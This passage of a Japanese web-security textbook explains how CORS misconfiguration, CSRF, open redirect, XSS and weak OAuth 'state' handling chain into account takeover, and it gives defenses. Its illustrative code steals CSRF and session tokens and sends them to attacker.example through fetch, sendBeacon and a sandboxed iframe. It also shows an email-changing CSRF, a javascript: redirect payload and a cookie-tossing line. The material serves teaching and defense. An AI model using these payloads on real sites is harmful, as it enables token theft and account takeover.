# 第8章 CSRF/CORSの連鎖と他脆弱性との組み合わせ

## CORS→CSRFトークン窃取→ATOの連鎖

第8章のこれまでの節では、CSRFとCORSを「それぞれ単体の脆弱性」として扱ってきました。しかし現実のバグバウンティで高額報酬（Critical判定）を生むのは、多くの場合**単体の脆弱性ではなく連鎖（chain）**です。とりわけCORSとCSRFは、片方が「攻撃者が別オリジンからレスポンスを読める」性質を持ち、もう片方が「そのレスポンスの中に秘密（CSRFトークン、セッショントークン）が入っている」構造を持つため、**組み合わさると互いの防御を無力化し合う**という危険な相性を持っています。

この節では、実在の2本のライトアップを土台に、次の2つの連鎖パターンを仕組みレベルで解剖します。

1. **CORS設定ミス → CSRFトークンの窃取 → プロフィール改変CSRF → アカウント乗っ取り（ATO）**（資料1）
2. **オープンリダイレクト → XSS → CORS設定ミス → セッショントークン窃取 → 1クリックATO**（資料2）

> ⚠️ **取得に関する注記**: 本節が参照する2本のMedium記事は、自動取得時にいずれも `HTTP 403 Forbidden`（Mediumのボット遮断）で直接本文を取得できませんでした。以下の記述は、記事タイトル・検索エンジン経由で得られた各記事の要約スニペット・および筆者（本教科書執筆者）のCORS/CSRFに関する一般知識を突き合わせて**再構成**したものです。攻撃対象となった実在サービス名・具体的なドメインは伏せられており、本文中のヘッダ値・エンドポイント名・コードは**原理を説明するための代表的な再現例**です。正確な原文は各節末尾のURLからご自身でご確認ください。

---

### なぜCORSとCSRFトークンは「敵対」するのか（前提の整理）

連鎖を理解する前に、両者の防御原理が**同じ前提に立っている**ことを押さえます。

- **CSRFトークン**（別名: anti-CSRFトークン、synchronizer token）とは、サーバがフォームやセッションに埋め込む、推測困難なランダム値です。状態変更リクエスト（プロフィール更新、パスワード変更など）を受け取ったサーバは「このトークンが一致しなければ処理しない」と検査します。攻撃者は被害者のブラウザにリクエストを**送らせる**ことはできても、**トークンの値を知らない**ため、正しいリクエストを組み立てられない――これがCSRF対策の核心です。
- **CORS（Cross-Origin Resource Sharing）**とは、ブラウザの同一オリジンポリシー（SOP: 別オリジンのJavaScriptがレスポンス本文を読むことを禁じる規則）を、サーバの明示的な許可があるときだけ緩める仕組みです。サーバがレスポンスに `Access-Control-Allow-Origin`（以下ACAO）ヘッダを付けて「このオリジンには読ませてよい」と宣言します。

ここに**根本的な矛盾**が潜みます。CSRFトークンの防御は「攻撃者はトークン値を**読めない**」という前提に依存しています。ところがCORS設定がミスっていて、攻撃者オリジンに対してもレスポンス本文の読み取りを許してしまうと、**攻撃者はトークンが埋め込まれたページ／APIレスポンスを別オリジンから読み取れてしまう**。つまり、CSRFトークンという防御の**唯一の前提が崩壊する**のです。

#### 「危険なCORS設定」の具体的な形

CORSが「悪用可能」になる条件は、次の2つが**同時に**成立するときです。

```http
# サーバのレスポンス（危険な例）
Access-Control-Allow-Origin: https://attacker.example      ← 攻撃者オリジンをそのまま反射
Access-Control-Allow-Credentials: true                     ← Cookie等の認証情報付きを許可
```

- **ACAOにリクエストの `Origin` をそのまま反射（reflect）している**: サーバ実装が「送られてきた `Origin` ヘッダの値をコピーしてACAOに入れる」と、事実上**あらゆるオリジン**が許可されます。`Access-Control-Allow-Origin: *`（ワイルドカード）は一見危険ですが、後述のとおり `*` は認証情報付きリクエストでは**使えない**ため、むしろ「反射型」の方が悪用しやすいのです。
- **`Access-Control-Allow-Credentials: true` が付いている**: これが無いと、ブラウザは `withCredentials`（Cookie付き）で送ったレスポンスをJavaScriptに渡しません。これが `true` のときだけ、**被害者のログイン済みセッションで認証されたレスポンス本文**を攻撃者JSが読めます。

> **仕組みの核心**: 仕様上、`Access-Control-Allow-Origin: *` と `Access-Control-Allow-Credentials: true` は**併用できません**（ブラウザがレスポンスを拒否する）。だからこそ攻撃者にとって美味しいのは「`Origin` を反射しつつ `Credentials: true`」という組み合わせです。これなら特定オリジン（攻撃者ドメイン）宛のACAOになり、かつ認証付きレスポンスを読める、という両立が成立してしまいます。開発者が「`*` は危ないから `Origin` を動的に返そう」と善意で書いたコードが、検証を怠ると最悪の設定になるわけです。

---

### 資料1: CORS設定ミス → CSRFトークン窃取 → プロフィール改変によるATO

このライトアップの本質は、**2つの脆弱性の連鎖**です。単体では低〜中程度の2つのバグが、組み合わさることでアカウント乗っ取りに昇格します。

- **バグA（CORS設定ミス）**: パスワードリセット関連のエンドポイントが、認証情報付きのクロスオリジンリクエストに対して、レスポンス本文をそのまま返す設定になっていた。そのレスポンス本文の中に**CSRFトークンが含まれていた**。
- **バグB（CSRF）**: プロフィール更新エンドポイント（氏名・メールアドレス・国などを変更する機能）が、`Origin` チェックやCSRFトークンだけに依存しており、**トークンさえ正しければクロスオリジンからでも状態変更を受け付ける**状態だった。

単体で見ると、バグBは「有効なCSRFトークンが必要」なので、通常のCSRF攻撃（攻撃者はトークンを知らない）では成立しません。ところが**バグAでトークンを盗めば**、バグBの唯一の防壁が消え、攻撃者は被害者のメールアドレスを自分のものに書き換えられます。メールを書き換えれば、そこにパスワードリセットリンクを送ってパスワードを掌握でき、**完全なアカウント乗っ取り**が完成します。

#### ステップ1: CSRFトークンを盗む攻撃者ページ

被害者がログイン中に攻撃者のページを開いた瞬間、次のようなスクリプトが走ります。原理を示す代表的な再現コードです。

```html
<!-- attacker.example に置かれた悪意あるページ -->
<script>
  // 被害者のセッションCookie付きで、CSRFトークンを含むエンドポイントを叩く
  fetch('https://victim-app.example/account/reset-password', {
    method: 'GET',
    credentials: 'include'   // ← 被害者のCookieを一緒に送る。これが肝
  })
  .then(res => res.text())   // CORSが許可されているのでレスポンス本文を読める
  .then(body => {
    // レスポンス（HTMLやJSON）からCSRFトークンを抽出
    const token = body.match(/name="csrf_token" value="([^"]+)"/)[1];
    // 盗んだトークンを攻撃者サーバへ送信
    return fetch('https://attacker.example/collect?t=' + encodeURIComponent(token));
  });
</script>
```

**なぜこれで盗めるのか**:

1. `credentials: 'include'` により、ブラウザはリクエストに `victim-app.example` の**セッションCookieを自動付与**します。サーバから見れば「ログイン済み本人からのリクエスト」に見え、CSRFトークンを含む個人向けレスポンスを返します。
2. 通常であればSOPにより、`attacker.example` のJSはこのレスポンス本文を**読めません**。しかしサーバがリクエストの `Origin: https://attacker.example` を反射して `Access-Control-Allow-Origin: https://attacker.example` と `Access-Control-Allow-Credentials: true` を返すため、ブラウザは「読み取りOK」と判断し、`res.text()` が成功します。
3. こうしてレスポンス内の `csrf_token` が攻撃者の手に渡ります。

> **補足（SameSite Cookieとの関係）**: この攻撃は「被害者のCookieがクロスオリジンfetchに載る」ことが大前提です。近年のブラウザはセッションCookieの `SameSite` 属性を明示指定がない場合 `Lax` 相当として扱うため、**クロスサイトのJSリクエストにはCookieが送られない**のが既定動作です。したがってこの連鎖が刺さるのは、対象がセッションCookieに `SameSite=None; Secure` を付けている（サードパーティ文脈でCookie送信を許している）場合が中心です。裏を返せば、`SameSite=Lax/Strict` は本連鎖に対する強力な緩和策になります。

#### ステップ2: 盗んだトークンでプロフィールを改ざん（メール乗っ取り）

トークンを入手したら、それを使って被害者のメールアドレスを攻撃者のものに書き換えます。

```html
<script>
  // ステップ1で盗んだ token を使う
  fetch('https://victim-app.example/account/update-profile', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'first_name=x&last_name=x&country=US' +
          '&email=attacker@evil.example' +   // ← 被害者のメールを乗っ取る
          '&csrf_token=' + stolenToken
  });
</script>
```

**なぜこれでATOに至るのか**:

- 更新エンドポイントは「有効なCSRFトークン＋有効なセッション」を満たすリクエストを正規のものと信じます。両方とも被害者のブラウザ経由で満たされているため、サーバはメール変更を実行します。
- メールアドレスを攻撃者のものにすげ替えた後、通常のパスワードリセット機能を使えば、リセットリンクは**攻撃者のメールボックス**に届きます。攻撃者はパスワードを設定し直し、被害者を締め出して**アカウントを完全に掌握**します。

この連鎖の教訓は明確です。**CSRFトークンは「秘密であること」でしか守れない。CORS設定ミスは、その秘密を漏らすチャネルになる。** ゆえにCSRF対策とCORS設定は「別々の担当領域」ではなく、**同じ脅威モデルの中で一緒に検証すべき**ものなのです。

> 出典: From CORS Misconfigration To CSRF Account Takeover（Mustafa Adam Gamaraldin Abdalla） — https://wadgamaraldeen.medium.com/from-cors-misconfigration-to-csrf-account-takeover-ce5d85f41eda

---

### 資料2: オープンリダイレクト → XSS → CORS → セッショントークン窃取（1クリックATO）

2本目のライトアップは、**4つの脆弱性を段階的に昇格（escalation）させる**古典的かつ教育的な連鎖です。各段階で深刻度が上がっていくのが見どころです。

| 段階 | 脆弱性 | 単体での深刻度 | 連鎖後の役割 |
|---|---|---|---|
| 1 | オープンリダイレクト | Low | 被害者を細工URLへ誘導する足がかり |
| 2 | 反射型XSS | Medium | 信頼された同一オリジンでJSを実行 |
| 3 | CORS設定ミス | Medium | セッショントークンをJSで読み取り可能に |
| 4 | セッショントークン窃取 | → **Critical (ATO)** | 盗んだトークンで本人になりすまし |

#### 段階1〜2: オープンリダイレクトからXSSへ

- **オープンリダイレクト**とは、`?redirect=` や `?next=` のようなパラメータで指定された任意URLへ、検証なしにブラウザを飛ばしてしまう脆弱性です。単体では「フィッシングの信頼性を高める」程度でLow判定になりがちです。ログイン後に攻撃者ドメインへ飛ばされることでリダイレクト先が無検証だと確認されました。
- ここから**XSSへ昇格**します。リダイレクト処理が `javascript:` スキームのURLまで受け入れてしまう、あるいは戻り先パラメータがHTMLに反射される場合、`javascript:alert(1)` のようなペイロードでJavaScript実行に持ち込めます。XSSが成立すると、**攻撃者のJSが「被害者が信頼する正規オリジン上」で動く**――これが決定的に重要です。同一オリジンで動くJSは、SOPの制約を受けずにそのオリジンのAPIを叩けるからです。

```
# 段階1: オープンリダイレクト（無検証の戻り先）
https://victim-app.example/login?next=https://attacker.example

# 段階2: リダイレクト経路にjavascript:を注入してXSSへ昇格
https://victim-app.example/login?next=javascript:alert(document.domain)
```

#### 段階3〜4: `/api/auth/session` からトークンを抜く

この連鎖の核心は、**`/api/auth/session` というエンドポイントが、現在ログイン中ユーザーのアクセストークン（セッショントークン）をJSONで返していた**点にあります。

> **仕組みの核心（`/api/auth/session` とは何か）**: `/api/auth/session` は、Next.js向け認証ライブラリ **NextAuth.js（現Auth.js）** が既定で公開するエンドポイントです。フロントエンドのクライアントJSが「今のログイン状態」を取得するために叩く設計で、レスポンスにはユーザー情報や、設定によっては `accessToken` が平文JSONで含まれます。**本来はサイト自身のフロントJSだけが読むべきもの**ですが、CORSが誤って外部オリジンに開かれていると、外部のJSからでもこの機微なJSONを読めてしまいます。設計者が「フロントが使う内部API」と油断しがちな箇所で、だからこそ狙われます。

段階2のXSS（同一オリジン実行）と組み合わさると、次のような窃取が成立します。

```javascript
// 正規オリジン上で走るXSSペイロード（同一オリジンなのでCORSすら要らないことも多い）
fetch('/api/auth/session', { credentials: 'include' })
  .then(r => r.json())
  .then(session => {
    // session.accessToken に本人のトークンが入っている
    navigator.sendBeacon(
      'https://attacker.example/steal',
      JSON.stringify(session)
    );
  });
```

さらにライトアップでは、XSSを経由せず**CORS単体でこのJSONを読む**経路も示されています。ここで登場するのが `Origin: null` を悪用する**サンドボックス化iframe**のテクニックです。

```html
<!-- attacker.example のページ。ACAO: null を信頼するサーバに刺さる -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://victim-app.example/api/auth/session', {
      credentials: 'include'
    })
    .then(r => r.text())
    .then(d => {
      // 盗んだセッションJSONを画像リクエストで外部送信
      new Image().src = 'https://attacker.example/steal?d=' + encodeURIComponent(d);
    });
  <\/script>
"></iframe>
```

**なぜ `sandbox` 属性でトークンが盗めるのか**:

- `sandbox="allow-scripts"` を付けたiframeは、JavaScriptの実行は許可しつつ、**そのフレームの生成元（origin）を剥ぎ取り、`Origin` ヘッダを文字列 `null` にして**リクエストを送ります（`data:` URIや `file:` URIも同様に `null` になります）。
- サーバが「`Access-Control-Allow-Origin: null` を返す（=`null` オリジンを信頼する）」設定だと、ブラウザは「このオリジンには読ませてOK」と誤認し、認証付きレスポンス本文をJSに渡します。開発者がテスト目的で `null` を許可リストに入れたまま本番に残す、というのがよくある原因です。
- `srcdoc` はiframeの中身HTMLをインラインで埋め込む属性で、外部ファイルを用意せずワンショットで攻撃コードを流し込めます。

こうして得た `accessToken` を攻撃者が自分のリクエストの `Authorization: Bearer <token>` に載せれば、被害者本人としてAPIを叩けます。ライトアップは「ページ読み込みからアカウント侵害まで2分未満、フィッシングもマルウェアもログ上のアラートも無し」と、**1クリックATOの静かな恐ろしさ**を強調しています。

> 出典: 1-Click Account Takeover (ATO) via CORS Misconfiguration（Muhammed Mubarak） — https://medium.com/@mohammed01550038865/1-click-account-takeover-ato-via-cors-misconfiguration-64dc26d24917

---

### 連鎖を成立させる「条件」を分解する

2つの資料を横断すると、CORS→トークン窃取→ATOの連鎖が成立するには、次の**すべて**が揃う必要があることが分かります。逆に言えば、どれか1つを断てば連鎖は切れます。

1. **秘密がレスポンス本文に入っている**: CSRFトークンやアクセストークンが、GETで取得できるHTML/JSONに含まれている。
2. **CORSが認証付きで外部に開いている**: `Origin` の反射＋`Credentials: true`、または `null` の許可。
3. **Cookieがクロスサイトで送られる**: セッションCookieが `SameSite=None; Secure`（もしくはトークンがCookieでなくレスポンスJSONで返る設計）。
4. **盗んだ秘密で状態変更・なりすましができる**: そのトークンだけでメール変更やAPI呼び出しが通る。

#### 「単体は低リスク」の罠

このテーマの最大の教訓は、**トリアージ（深刻度判定）を単体で行う危険性**です。オープンリダイレクト単体はLow、CORS設定ミス単体も「機微データが返らなければInfo〜Low」と見なされがちです。しかし、

- オープンリダイレクト（Low）＋ XSS昇格 ＋ CORS（Medium）＝ **Critical (ATO)**
- CORS（Medium）＋ CSRFトークン漏洩 ＋ プロフィール更新CSRF（Medium）＝ **Critical (ATO)**

というように、**低リスクの部品が組み合わさって最高深刻度に化ける**のがこの分野の特徴です。防御側は「この単体バグは大したことない」と切り捨てる前に、**そのバグが他のどんなバグと連鎖しうるか**を必ず問う必要があります。

---

### 防御: 連鎖のどの環でも断てる

防御目的の観点から、各環に対する具体的な対策を整理します。**多層防御**の考え方で、複数を併用するのが原則です。

#### CORS設定を厳格化する（環2を断つ）

- **`Origin` を無検証で反射しない**。許可オリジンは**サーバ側の固定許可リスト（allowlist）と完全一致**で検証する。前方一致・後方一致（`endsWith('victim-app.example')` など）は `victim-app.example.attacker.com` を通してしまうため厳禁。
- **`Access-Control-Allow-Credentials: true` は本当に必要なエンドポイントだけに限定**する。認証付きレスポンスを外部に開く必然性がなければ付けない。
- **`null` オリジンを許可リストに入れない**。サンドボックスiframe／`data:` URI経由の窃取を防ぐ。
- 機微なJSON（`/api/auth/session` など）は、そもそもクロスオリジンで読めないよう、CORSをデフォルト拒否にする。

#### 秘密をレスポンスに載せない・トークンをCookieに閉じ込める（環1・環3を断つ）

- アクセストークンを**JSから読めるレスポンスJSONに入れない**。可能なら `HttpOnly; Secure; SameSite=Lax`（または `Strict`）のCookieに格納し、JSからもクロスサイトfetchからも読めなくする。
- セッションCookieに **`SameSite=Lax` 以上**を設定する。これだけで「クロスサイトJSにCookieが載る」前提が崩れ、資料1・資料2の窃取経路の多くが機能しなくなる。`SameSite=None` を使うなら、その必然性を厳しく吟味する。

#### CSRF対策をトークン単独に依存させない（環1・環4を断つ）

- CSRFトークンは**セッション単位でランダム生成**し、レスポンスへの露出を最小化する。加えて `SameSite` Cookie・カスタムリクエストヘッダ要求（`X-Requested-With` 等）・`Origin`/`Referer` の**サーバ側検証**を組み合わせ、トークンが漏れても即ATOにならない設計にする。
- メールアドレス変更・パスワード変更といった**クリティカルな操作には、現在のパスワード再入力や再認証（step-up authentication）を要求**する。盗んだトークン1つで即メール乗っ取り→リセット、という連鎖を最終段で断ち切れる。

#### XSS・オープンリダイレクトを潰す（連鎖の起点を断つ）

- リダイレクト先は**相対パスのみ許可**、または許可リスト照合する。`javascript:` などの危険スキームを拒否する。
- 出力エスケープとContent Security Policy（CSP）でXSSを抑止する。XSSが無ければ「同一オリジンでのトークン窃取」という最強経路が塞がる。

---

### この節のまとめ

- CORSとCSRFトークンは、どちらも「攻撃者は秘密を**読めない**」という同じ前提に立つ。CORS設定ミスはその前提を破壊し、CSRF対策を無効化する。
- 資料1は「CORSでCSRFトークンを盗み、プロフィール更新CSRFでメールを乗っ取る」2脆弱性連鎖。資料2は「オープンリダイレクト→XSS→CORS→`/api/auth/session` のトークン窃取」の4段階連鎖。いずれも**低リスク部品の合成でCritical（ATO）に到達**する。
- 連鎖成立には「秘密がレスポンスに入る／CORSが認証付きで開く／Cookieがクロスサイトで飛ぶ／盗んだ秘密でなりすませる」の4条件が必要。**どれか1つを断てば連鎖は切れる**。
- 防御は多層で。CORS厳格化・`SameSite` Cookie・トークンの非露出・クリティカル操作の再認証・XSS/オープンリダイレクト対策を組み合わせる。

## OAuth stateパラメータ欠落とCSRF ATO

OAuth 2.0 の認可コードフロー（Authorization Code Flow）は、それ自体が「ブラウザのリダイレクトを介した3者間の橋渡し」であり、構造的に CSRF（Cross-Site Request Forgery、被害者のブラウザを踏み台にして意図しないリクエストを送らせる攻撃）と隣り合わせになっている。この節では、OAuth の `state` パラメータが本質的には CSRF トークンそのものであること、その欠落が「ログイン CSRF」から本格的なアカウント乗っ取り（ATO: Account Takeover）へと直結する仕組み、そして「`state` があっても防げないケース（静的・予測可能・セッション非結合な `state`）」までを、原典に沿って仕組みレベルで解説する。

なぜこれが CSRF/CORS の教科書の一章に入るのか。第7章までで見た古典的な CSRF は「被害者に、被害者自身のセッションで、攻撃者の望む状態変更リクエストを送らせる」ものだった。OAuth の CSRF は方向が逆転することがある。すなわち「被害者に、**攻撃者の**認可コード（credential）を使わせ、被害者のアプリ内アカウントを**攻撃者のアイデンティティに紐付けさせる**」——これが後述する「login CSRF / account linking CSRF」で、結果として攻撃者は自分の SNS ログインで被害者のアプリアカウントに入れてしまう。CSRF の防御思想（リクエストの出所を検証する）が、OAuth では `state` という形で実装されている、という一点で両者は完全につながっている。

### OAuth 認可コードフローと `state` の位置づけ（前提の整理）

まず記号を固定する。登場人物は3者。

- **ユーザー（Resource Owner）**: 被害者になりうるブラウザの持ち主。
- **クライアント（RP: Relying Party）**: 「Google でログイン」ボタンを置いている当のアプリ。脆弱性の主な所在地。
- **認可サーバ（IdP: Identity Provider）**: Google / GitHub など、本人確認とコード発行を担う側。

認可コードフローの標準的な流れは次の通り。

```
(1) ユーザーがRPで「GitHubでログイン」を押す
(2) RP → ブラウザ: IdPの認可エンドポイントへリダイレクト
    https://idp.example/authorize
      ?response_type=code
      &client_id=RP_CLIENT_ID
      &redirect_uri=https://rp.example/callback
      &scope=openid email
      &state=RANDOM_PER_REQUEST_VALUE   ← これがCSRFトークン
(3) ユーザーがIdPでログイン・同意
(4) IdP → ブラウザ: RPのredirect_uriへリダイレクト
    https://rp.example/callback?code=AUTH_CODE&state=RANDOM_PER_REQUEST_VALUE
(5) RPが state を検証 → 一致すればcodeをトークンに交換 → ログイン確立
```

ここで決定的なのは **(2) で送った `state` と、(4) で戻ってきた `state` が同一であることを (5) で検証する**という往復である。RFC 6749（OAuth 2.0）第10.12節は `state` について「a non-guessable value（推測不能な値）」を要求し、これを CSRF 対策として位置づけている。つまり `state` は「この callback は、確かに**このブラウザが**、確かに**さっき自分が**開始したフローの続きである」ことを保証するための、リクエスト単位のワンタイムトークンにほかならない。CSRF トークンと役割が完全に同一である点を、まず腹に落としてほしい。

### 資料1: `state` 欠落による CSRF アカウント乗っ取り（stateパラメータ＝CSRFトークンの理解）

> ⚠️ **未取得の資料**: 「Hacking your first OAuth on the Web application: Account takeover using Redirect and State parameter」(TECNO Security / Medium) は自動取得できませんでした（理由: Medium が HTTP 403 Forbidden を返し、原本ミラー security.tecno.com/SRC/blogdetail/330 も JavaScript レンダリングのため本文テキストを抽出できなかった）。以下のURLからご自身で直接ご覧ください: https://medium.com/@security.tecno/hacking-your-first-oauth-on-the-web-application-account-takeover-using-redirect-and-state-5e857c7b1d43

（以下は未取得資料の補足として、記事タイトル・検索で得られた要旨・および一般知識に基づく解説です。記事の主眼は「`redirect_uri` の甘い検証」と「`state` の未実装/未検証」という2つの古典的欠陥が、いかにしてアカウント乗っ取りに至るかを初学者向けに解説することにある。）

#### `state` が無い／検証されないと何が起きるか

`state` を送らない、または戻り値を検証しない RP を考える。この RP の callback は、要するに次のような「素の GET リクエスト」を受け取ると、その `code` を無条件にトークン交換し、その IdP アイデンティティを**現在のブラウザセッションに結びつける**。

```
GET https://rp.example/callback?code=AUTH_CODE
```

このリクエストには、被害者アプリの Cookie 以外に「出所を証明するもの」が何もない。したがって攻撃者は次の手順で「被害者のアプリ内アカウントを、攻撃者の IdP アイデンティティに乗っ取らせる」ことができる。これが **login CSRF（別名 account linking CSRF）** である。

```
手順（account linking CSRF によるATO）
1. 攻撃者が自分のブラウザでRPのOAuthフローを開始し、
   自分のGitHubアカウントでIdPログイン・同意まで進める。
2. IdPがRPへ返すはずのリダイレクト直前で攻撃者が処理を止め、
   自分あての「code=ATTACKER_CODE」を含むcallback URLを横取りする。
   （実際にはトークン交換前のcallback URLを盗む／作る）
3. 攻撃者はこのURLを罠として仕込む:
   <img src="https://rp.example/callback?code=ATTACKER_CODE">
   あるいは自動送信フォーム・リンクとして被害者に踏ませる。
4. 被害者が自分のRPログイン済みセッションでこのURLを開くと、
   RPは「ATTACKER_CODE」をトークン交換し、
   攻撃者のGitHubアイデンティティを"被害者のRPアカウント"に紐付ける。
5. 以後、攻撃者は自分のGitHubログインでRPにサインインでき、
   被害者のRPアカウント（データ・権限）にアクセスできる。
```

なぜこれが成立するのか。`state` があれば手順4で「戻ってきた `state` が、このブラウザが手順で自分で生成・保存した値と一致するか」を RP が検証する。攻撃者が仕込んだ URL の `state`（あるいは `state` 無し）は、被害者ブラウザが保存している値と一致しないため、RP はフローを中断できる。逆に `state` が無い／検証されなければ、この「出所チェック」が丸ごと欠落し、任意の攻撃者由来 `code` を被害者セッションに流し込めてしまう。CSRF の本質「リクエストの出所を検証しない」が、そのまま OAuth に現れた形である。

#### `redirect_uri` 操作との連鎖

記事のもう一つの柱は `redirect_uri` の検証不備である。IdP が `redirect_uri` を厳密一致（exact match）でなく前方一致・部分一致・サブドメイン許容などで緩く検証していると、攻撃者は次のように**認可コードを攻撃者のサーバへ横取り**できる。

```
攻撃者が誘導する認可リクエスト（redirect_uri改ざん）:
https://idp.example/authorize
  ?response_type=code
  &client_id=RP_CLIENT_ID
  &redirect_uri=https://rp.example.attacker.com/callback   ← 緩い検証を突破
  &scope=openid email
  &state=...

被害者がログイン・同意すると、codeは attacker.com に届く:
GET https://rp.example.attacker.com/callback?code=VICTIM_CODE&state=...
```

`state` 欠落が「攻撃者の code を被害者に使わせる（linking CSRF）」方向の攻撃なのに対し、`redirect_uri` 操作は「被害者の code を攻撃者が奪う（code 窃取）」方向の攻撃である。両者は独立にも成立するが、実務では「`redirect_uri` の緩さで code を盗み、`state` 欠落で検証を回避する」といった形で連鎖し、より確実な ATO になる。防御は次の2点が核心。

- **`state`**: 推測不能・リクエスト単位・セッション結合の値を必ず送り、callback で厳密検証する。
- **`redirect_uri`**: IdP・RP 双方で**完全一致（exact match）**のホワイトリスト検証を行う。ワイルドカードや前方一致は避ける。

#### 実世界の具体例: Jenkins GitHub Auth Plugin（CVE-2019-10315, 2019年4月）

「`state` 未実装 → linking CSRF → 管理者権限 ATO」の教科書的な実例が CVE-2019-10315 である。Jenkins の GitHub OAuth プラグインが `state` を一切使っていなかったため、攻撃者は自分の GitHub での OAuth フローをリダイレクト直前まで進め、その認可 URL を Jenkins 管理者に送りつけた。管理者がクリックすると、**管理者の Jenkins セッションに攻撃者の GitHub アカウントが紐付き**、攻撃者は自分の GitHub 認証情報で Jenkins にログインして管理者権限を得た。上記「account linking CSRF」の理屈がそのまま権限昇格に直結した事例として、修正状況（当該バージョンで `state` 検証を導入）とともに覚えておくとよい。

> 出典: Hacking your first OAuth on the Web application: Account takeover using Redirect and State parameter — TECNO Security (Medium) — https://medium.com/@security.tecno/hacking-your-first-oauth-on-the-web-application-account-takeover-using-redirect-and-state-5e857c7b1d43 （本文は403のため未取得。要旨は検索結果および一般知識で補足。CVE-2019-10315 は補足として付記）

### 資料2: `state` があっても刺さる——静的・予測可能・非結合な `state`（Snyk Labs part 2）

資料1が「`state` の欠落」を扱うのに対し、Snyk Labs のこの記事は一歩踏み込み、「`state` は存在するのに実装が甘くて刺さる」パターンを CVE つきで解剖している。教科書としての価値が高いのはこちらで、`state` を「ただ付ければよい」と誤解しないための必読事項である。

#### `state` が満たすべき3条件

記事の骨子は明快で、RFC 6749 が要求する「推測不能な値」を実装として成立させるには、`state` は次の**3条件すべて**を満たさねばならない、というものである。1つでも欠けると CSRF/ATO が成立する。

1. **Present（存在し検証される）**: `state` が送られ、callback で確かに検証される。
2. **Unpredictable（予測不能）**: リクエストごとに真のエントロピー（毎回異なる乱数）を含む。
3. **Session-bound（セッション結合）**: フローを開始した当のブラウザセッションに紐付けて検証される。

以下の各 CVE は、この3条件のどれかが破れている典型例である。

#### 予測可能な `state`: CVE-2025-68481 (fastapi-users)

`fastapi-users` ライブラリは `state` を JWT（JSON Web Token）で生成していたが、その中身が「ハードコードされた audience クレームと有効期限のみ」で、ユーザー固有・セッション固有の乱数を一切含んでいなかった。

```python
STATE_TOKEN_AUDIENCE = "fastapi-users:oauth-state"  # ← 固定値
state_data: dict[str, str] = {}                     # ← 空。乱数もセッション情報もなし
state = generate_state_token(state_data, state_secret)
```

callback 側の検証は「JWT の署名整合性と有効期限」しか見ておらず、`state` を**開始したブラウザセッションと突き合わせていなかった**（＝条件3の欠落）。しかも中身が実質固定のため、あるユーザー向けに正しく発行された `state` を攻撃者が横取りし、別の被害者に使い回せた（＝条件2の欠落）。JWT は「約1時間、誰に対しても有効」だったため、攻撃者は次のように login CSRF を成立させられた。

```
攻撃機構:
1. 攻撃者がOAuthフローを開始し、正当な state トークンを入手。
2. 攻撃者が自分の資格情報でIdP認証を完了し、attacker_code を得る。
3. 被害者に callback?code=<attacker_code>&state=<captured_state> を開かせる。
4. state のJWTが（ユーザー非依存で）有効なため検証を通過し、
   被害者は攻撃者アカウントでログインさせられる（login CSRF）。
```

**なぜ JWT なのに危険なのか**が要点。JWT は「改ざんされていないこと」は保証するが、「このブラウザが今回のフローで自分で生成した値であること」は保証しない。中身に per-request 乱数を入れ、かつ callback 時に自セッション保存値と照合しない限り、署名の正しい JWT は「誰でも作れる正規の通行証」に堕する。

#### セッション非結合・乱数なし: AI ワークスペースの事例

別の実サービス（記事では AI ワークスペース製品）では、`state` に乱数もセッション相関も無く、リダイレクト先とユーザー参照を JSON で詰めただけだった。

```javascript
state: JSON.stringify({
  redirect: redirectPath,
  user: userRef,
})
```

サーバ側の追跡もセッション結合も無いため、攻撃者は次の手順で被害者を攻撃者アカウントにログインさせられた。

```
1. 攻撃者が /auth/start/<provider> を開始し、認可URLを取得。
2. 攻撃者が自分のプロバイダアカウントでOAuthを完走。
3. 被害者を /auth/callback/<provider>?code=<attacker_code>&state=<attacker_state> へ誘導。
4. セッション検証が無いため、被害者は攻撃者アカウントでログイン状態になる。
```

##### エスカレーション: Cookie Tossing との連鎖

記事はさらに、この linking CSRF を「保存型 XSS ＋ Cookie Tossing」と連鎖させて秘密情報を窃取する高度化を示している。対象アプリの Cookie が `__Host-` プレフィックスを使っていなかったため、攻撃者は path 属性を限定した Cookie を注入できた。

```javascript
document.cookie='_access_cookie=<ATTACKER_SESSION>;
path=/api/mcp-server/new; samesite=lax';
```

**Cookie Tossing の原理**: `__Host-` プレフィックス付き Cookie は「Secure・path=/・Domain 指定なし」が強制され、サブドメインや path を絞った上書きができない。プレフィックスが無いと、攻撃者は `path=/api/mcp-server/new` のように**特定パスにだけ効く Cookie** を後から差し込める。ブラウザは同名 Cookie が複数あるとき、より具体的な path のものを優先して送るため、被害者が該当パス（`/api/ai-provider/new` など）へリクエストするときだけ**攻撃者のセッションが使われ**、被害者は通常のブラウジングを続けたまま、そこで作られる秘密情報が攻撃者アカウントへ流れ込む。CSRF/CORS 章で扱ってきた「Cookie の送出制御」と「プレフィックス Cookie」の知識が、OAuth の文脈でそのまま防御の要になる好例である。

#### 交換可能な `state`: CVE-2025-68158 (Authlib)

`Authlib` では、`state` の検証をキャッシュ（外部ストア）で行う際に**セッション文脈を無視**していた。

```python
def get_state_data(self, session, state):
    key = f"_state_{self.name}_{state}"
    if self.cache:
        value = self._get_cache_data(key)  # session引数を無視してstate値だけで引く
```

トークン認可時の検証も、どのセッションが `state` を提示したかに関係なく成功した。

```python
data = self.framework.get_state_data(session, state)
# どのセッションが state を提示しても成功してしまう
token = self.fetch_access_token(**params)
```

結果、「有効な `state` を持つ攻撃者なら誰でも交換を完了できる」状態となり、キャッシュ由来ストレージを使うアプリで login CSRF が成立した（＝条件3の欠落）。修正は「外部キャッシュを使う場合でも `state` をユーザーセッションに保存し、開始セッションへ結合する」ことを必須化した。**教訓**: `state` の保存先が外部キャッシュ（Redis 等）でも、キーに `state` 値だけを使うと「グローバルに引ける通行証」になる。必ずセッション ID を鍵に混ぜるか、セッション側にも同じ値を持たせて突合する。

#### カスタム/クロスデバイスフローの罠: CLI SSO

ブラウザとターミナルをまたぐ CLI ログイン（SSO）では、そもそもブラウザセッションへの結合が構造的に難しく、`state` 検証が形骸化しやすい。記事の例では次の流れだった。

```
1. ターミナルがリンクを出力:
   /sso/key/generate?source=cli&key=sk-[user_key]
2. サーバが state を生成: "…-session-token:<key>"（エントロピーなし）
3. ユーザーがブラウザでリンクを開きOAuth完走
4. プロバイダのcallback /sso/callback は state が接頭辞で始まるかだけ確認
   （issuer検証もしない）
